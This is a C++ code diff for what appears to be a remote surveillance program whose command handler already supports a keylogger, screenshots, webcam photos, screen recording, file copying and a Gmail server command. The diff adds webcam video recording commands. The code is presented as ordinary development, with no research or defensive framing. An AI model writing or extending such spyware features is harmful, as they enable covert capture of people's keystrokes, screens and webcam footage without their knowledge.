@@ -111,7 +111,7 @@ bool isValidCommand(const std::string& cmd)
         "help", "list_services", "start ", "stop ", "list_apps",
         "start_keylogger", "stop_keylogger", "screenshot", "webcam_photo",
         "restart", "shutdown", "start_record", "stop_record", "gmail_server", 
-        "copyfile "
+        "copyfile ", "start_webcam_record", "stop_webcam_record"
     };
 
     for (const auto& validCmd : validCommands)
@@ -143,7 +143,10 @@ std::string executeCommand(const std::string& cmd)
             "restart                             - Restart the system\n"
             "shutdown                        - Shutdown the system\n"
             "start_record                    - Start screen recording\n"
-            "stop_record                    - Stop screen recording\n";
+            "stop_record                    - Stop screen recording\n"
+            "start_webcam_record            - Start webcam recording\n"
+            "stop_webcam_record             - Stop webcam recording\n";
+
         return helpMsg;
     }
     else if (cmd == "list_services")
@@ -235,6 +238,26 @@ std::string executeCommand(const std::string& cmd)
             return filename;
         }
         else return "No recording in progress.";
+    }
+    else if (cmd == "start_webcam_record")
+    {
+        if (!isWebcamRecording())
+        {
+            std::string filename = fs::current_path().string() + "\\webcam_record.avi";
+            startWebcamRecording(filename);
+            return "Webcam recording started.";
+        }
+        else return "Webcam recording is already in progress.";
+    }
+    else if (cmd == "stop_webcam_record")
+    {
+        if (isWebcamRecording())
+        {
+            stopWebcamRecording();
+            std::string filename = fs::current_path().string() + "\\webcam_record.avi";
+            return filename;
+        }
+        else return "No webcam recording in progress.";
     }
 
     return "Unknown command: " + cmd;
